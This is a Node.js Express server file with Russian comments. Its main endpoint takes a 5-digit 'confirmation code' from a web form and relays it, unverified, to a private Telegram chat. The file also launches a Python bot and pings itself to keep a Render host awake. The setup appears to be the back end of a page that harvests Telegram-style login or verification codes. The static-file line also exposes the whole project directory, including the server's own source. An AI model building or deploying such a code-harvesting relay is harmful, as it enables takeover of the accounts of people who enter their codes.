const express = require('express');
const path = require('path');
const { spawn } = require('child_process');
const https = require('https');
const http = require('http');

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 1. Раздаем статику из КОРНЯ проекта (исправляет ошибку ENOENT public/index.html)
app.use(express.static(__dirname));

// 2. Главная страница
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 3. Пинг для предотвращения засыпания
app.get('/ping', (req, res) => {
    res.status(200).send('OK');
});

// ===== 4. ЭНДПОИНТ ОТПРАВКИ 5-ЗНАЧНОГО КОДА =====
const BOT_TOKEN = process.env.BOT_TOKEN || 'ВАШ_ТОКЕН_БОТА';
const CHAT_ID = process.env.CHAT_ID || 'ВАШ_CHAT_ID';

app.post('/send-code', (req, res) => {
    const { code } = req.body;
    const cleanCode = code ? code.toString().trim() : '';

    // Валидация: строго 5 цифр
    if (!/^\d{5}$/.test(cleanCode)) {
        return res.status(400).json({ 
            success: false, 
            error: 'Код должен состоять ровно из 5 цифр' 
        });
    }

    console.log(`[SERVER]: Отправка кода ${cleanCode} в Telegram...`);

    const message = encodeURIComponent(`🔑 Получен код подтверждения: ${cleanCode}`);
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;

    https.get(telegramUrl, (apiRes) => {
        let rawData = '';
        apiRes.on('data', chunk => rawData += chunk);

        apiRes.on('end', () => {
            try {
                const response = JSON.parse(rawData);

                // ПРОВЕРЯЕМ: ответил ли Telegram "ok: true"
                if (apiRes.statusCode === 200 && response.ok) {
                    console.log(`[TELEGRAM OK]: Код ${cleanCode} доставлен.`);
                    return res.json({ success: true, message: 'Код успешно отправлен!' });
                } else {
                    console.error(`[TELEGRAM ERROR]:`, response);
                    return res.status(400).json({ 
                        success: false, 
                        error: response.description || 'Ошибка отправки в Telegram (проверьте Токен и Chat ID)' 
                    });
                }
            } catch (err) {
                console.error(`[PARSE ERROR]:`, err);
                return res.status(500).json({ success: false, error: 'Ошибка ответа сервера Telegram' });
            }
        });
    }).on('error', (err) => {
        console.error(`[NETWORK ERROR]:`, err.message);
        res.status(500).json({ success: false, error: 'Ошибка соединения с Telegram' });
    });
});

// ===== 5. ФУНКЦИЯ ЗАПУСКА PYTHON БОТА =====
function startTelegramBot() {
    const pythonCmd = process.platform === 'win32' ? 'python' : 'python3';
    console.log(`🚀 Запуск бота: ${pythonCmd} bot.py...`);

    const botProcess = spawn(pythonCmd, ['bot.py']);

    botProcess.stdout.on('data', (data) => console.log(`[BOT]: ${data.toString().trim()}`));
    botProcess.stderr.on('data', (data) => console.error(`[BOT ERROR]: ${data.toString().trim()}`));

    botProcess.on('close', (code) => {
        console.log(`[BOT] Завершился с кодом ${code}. Перезапуск через 3 сек...`);
        setTimeout(startTelegramBot, 3000);
    });
}

startTelegramBot();

// ===== 6. АВТОПИНГ ПРОТИВ СНА RENDER =====
const SITE_URL = process.env.RENDER_EXTERNAL_URL;
if (SITE_URL) {
    setInterval(() => {
        const client = SITE_URL.startsWith('https') ? https : http;
        client.get(`${SITE_URL}/ping`, () => {}).on('error', () => {});
    }, 10 * 60 * 1000);
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🌐 Сервер запущен на порту ${PORT}`));
